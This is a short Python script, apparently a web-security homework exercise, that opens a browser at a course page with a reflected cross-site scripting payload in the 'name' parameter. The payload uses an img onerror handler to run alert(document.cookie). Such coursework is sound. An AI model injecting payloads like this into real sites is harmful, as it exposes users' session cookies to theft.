import webbrowser


url = 'http://www.wsb.com/Homework3/case04.php?name=<img src=1 href=1 onerror="javascript:alert(document.cookie)"></img>'
new = 2
webbrowser.open(url, new=new)
